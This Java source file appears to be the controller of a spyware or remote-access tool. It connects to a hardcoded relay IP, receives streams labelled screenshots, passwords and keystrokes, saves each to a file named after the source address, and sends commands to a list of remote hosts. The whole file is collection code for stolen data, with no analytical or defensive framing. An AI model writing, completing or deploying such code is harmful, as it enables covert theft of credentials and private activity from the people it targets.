package model;

import static model.ClientStatus.GREEN;
import static model.MessageState.*;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;

import view.GUI;

public class Server {

  private static final int PORT_NUMBER = 5720;
  private static final int MAX_CONNECTIONS = 20;
  private static final int MAX_MESSAGE_QUEUE_SIZE = 100;

  private final BlockingQueue<Message> clientMessages;
  private final Set<ClientConnection> clients;
  private Socket s;
  private InputStream in;
  private PrintWriter out;
  private String filename;
  private List<InetAddress> ips;

  private GUI gui;

  public Server() {
    clientMessages = new ArrayBlockingQueue<Message>(MAX_MESSAGE_QUEUE_SIZE);
    clients = Collections.newSetFromMap(new ConcurrentHashMap<ClientConnection, Boolean>());

    try {
      s = new Socket(InetAddress.getByName("25.135.29.20"), PORT_NUMBER);
      in = s.getInputStream();
      out = new PrintWriter(s.getOutputStream(), true);
      System.out.println(":) connection successful");

    } catch (IOException e) {
      e.printStackTrace();
    }

    new Thread() {
      @Override
      public void run() {
        int character = -1;
        MessageState state = NORMAL;
        int messageType = 0;
        int messageLength = 0;
        int offset = 0;
        int length = 0;
        byte[] bytes = null;
        String toIp = "";
        String fromIp = "";
        String ipList = "";


        try {
          // state machine that handles input from the server
          while (true) {
            System.out.println(state);
            if (state == NORMAL) {
              if ((character = in.read()) == -1) break;

              if (character != '!') {
                System.out.println("Expecting ! for state NORMAL, got: " + character + " " + (char)character);
              } else {
                state = GETTING_TYPE;
              }
            } else if (state == GETTING_TYPE) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_TO_IP;
              } else if (character >= '0' && character <= '9'){
                messageType *= 10;
                messageType += character - '0';
              } else {
                System.out.println("Expecting 0-9 for state WAITING_FOR_TYPE, got: " + character + " " + (char)character);
              }
            } else if (state == GETTING_TO_IP) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_FROM_IP;
              } else {
                toIp += (char)character;
              }
            } else if (state == GETTING_FROM_IP) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                state = GETTING_LENGTH;
              } else {
                fromIp += (char)character;
              }
            } else if (state == GETTING_LENGTH) {
              if ((character = in.read()) == -1) break;

              if (character == '!') {
                String prefix = "";
                String extension = "";

                if (messageType == 100) { // getting list of IPs
                  state = UPDATING_IPS;

                } else { // getting data to write to a file
                  switch (messageType) {
                  case 143: 
                    prefix = "screenshot";
                    extension = "png";
                    break;
                  case 144:
                    prefix = "passwords";
                    extension = "txt";
                    break;
                  case 145:
                    prefix = "keystrokes";
                    extension = "txt";
                    break;
                  case 146:
                    prefix = "idk";
                    extension = "txt";
                    break;
                  case 147:
                    System.out.println("hihi");
                    break;
                  default:
                    System.out.println("OH NO");
                    System.out.println(character + " " + (char)character + " " + messageType);
                    state = null;
                    break;
                  }

                  filename = prefix + " " + toIp + " " + s.getPort() + " " + System.currentTimeMillis() + "." + extension;
                  bytes = new byte[messageLength];
                  offset = 0;
                  state = RECEIVING_DATA;
                  status("Receiving " + prefix, null);
                }

              } else if (character >= '0' && character <= '9'){
                messageLength *= 10;
                messageLength += character - '0';
              } else {
                System.out.println("Expecting 0-9 for state WAITING_FOR_LENGTH, got: " + character + " " + (char)character);
              }
            } else if (state == RECEIVING_DATA) {
              length = in.read(bytes, offset, messageLength - offset);
              writeFile(bytes, offset, length);
              offset += length;
              if (offset >= bytes.length) {
                state = NORMAL;
                messageLength = 0;
                messageType = 0;
                toIp = "";
                fromIp = "";
                ipList = "";
              }
            } else if (state == UPDATING_IPS) {
              if (messageLength-- > 0) {
                if ((character = in.read()) == -1) break;
                ipList += (char)character;
              } else {
                String[] ipStrings = ipList.split(",");
                ips = new ArrayList<InetAddress>();
                for (String s : ipStrings) {
                  if (s != null && !s.isEmpty()) {
                    ips.add(InetAddress.getByName(s));
                  }
                }
                System.out.println(ips);
                state = NORMAL;
                messageLength = 0;
                messageType = 0;
                toIp = "";
                fromIp = "";
                ipList = "";
              }
            } else if (state == null) {
              System.out.println("something went wrong");
            }
          }
        } catch (IOException e) {
          e.printStackTrace();
        }
      };

    }.start();

    // listen for new connections (until too many people connect)
    //    new Thread() {
    //      @Override
    //      public void run() {
    //        while (selectedClients().size() < MAX_CONNECTIONS) {
    //          try {
    //            Socket s = s.accept();
    //            ClientConnection c = new ClientConnection(GREEN, Server.this, s);
    //            clients.add(c);
    //            status(s + " connected", null);
    //          } catch (IOException e) {
    //            // TODO Auto-generated catch block
    //            e.printStackTrace();
    //          }
    //        }
    //      }
    //
    //    }.start();

    // process messages from clients as they come in
    //    new Thread() {
    //      @Override
    //      public void run() {
    //        try {
    //          while (Math.random() == 3) {
    //            Message message = clientMessages.take();
    //            ClientConnection c = message.c;
    //            String s = message.s;
    //            System.out.println("\tmessage: " + s);
    //
    //            if (c.state == NORMAL) {
    //              if (s.startsWith("screenshot-size:")) {
    //                int bufferLength = Integer.parseInt(s.replace("screenshot-size: ", ""));
    ////                c.state = SENDING_PICTURE;
    //                c.bufferLength = bufferLength;
    //              } else {
    //                // nothing
    //              }
    //            } else if (c.state == MessageState.RECEIVING_DATA) {
    ////              c.writeFile(s);
    //            }
    //          }
    //                   
    //        } catch (InterruptedException e) {
    //          // TODO Auto-generated catch block
    //          e.printStackTrace();
    //        }
    //      
    //      }
    //    }.start();
  }

  private Set<ClientConnection> selectedClients() {
    Set<ClientConnection> selectedClients = new HashSet<ClientConnection>();
    for (ClientConnection c : clients) {
      if (c.status == GREEN) {
        selectedClients.add(c);
      }
    }
    System.out.println(selectedClients.size());
    return selectedClients;
  }

  public void sendCommand(int command) {
    Set<ClientConnection> selectedClients = selectedClients();
    for (ClientConnection c : selectedClients) {
      // TODO
      c.sendCommand(command);
    }
  }

  public void sendCommand(String command, String data) {
//    Set<ClientConnection> selectedClients = selectedClients();
//    for (ClientConnection c : selectedClients) {
    if (data == null) {
      data = "";
    }

    for (InetAddress i : ips) {
      try {
        out.write("!" + command + "!" + i.getHostAddress() + "!" + InetAddress.getLocalHost().getHostAddress() + "!" + data.length() + "!" + data);
        out.flush();
        System.out.println("!" + command + "!" + i.getHostAddress() + "!" + InetAddress.getLocalHost().getHostAddress() + "!" + data.length() + "!" + data);
      } catch (UnknownHostException e) {
        e.printStackTrace();
      }
    }
  }

  public void setGui(GUI gui) {
    this.gui = gui;
  }

  public void status(String string, ClientConnection cc) {
    System.out.println(string);
    gui.status(((cc == null) ? "" : cc.socket.getInetAddress().getHostAddress() + ": ") + string);
  }

  public void writeFile(byte[] bytes, int offset, int length) {
    FileOutputStream out;
    try {
      out = new FileOutputStream(filename, true);
      out.write(bytes, offset, length);
      out.close();
    } catch (FileNotFoundException e) {
      e.printStackTrace();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }



  //  public void receiveMessage(String line, ClientConnection c) {
  //    clientMessages.add(new Message(line, c));
  //    // TODO: catch exception if queue full
  //  }

  //  public void receiveMessage(int character, ClientConnection c) {
  //    clientMessages.add(new Message(character, c));
  //    // TODO: catch exception if queue full
  //  }

}
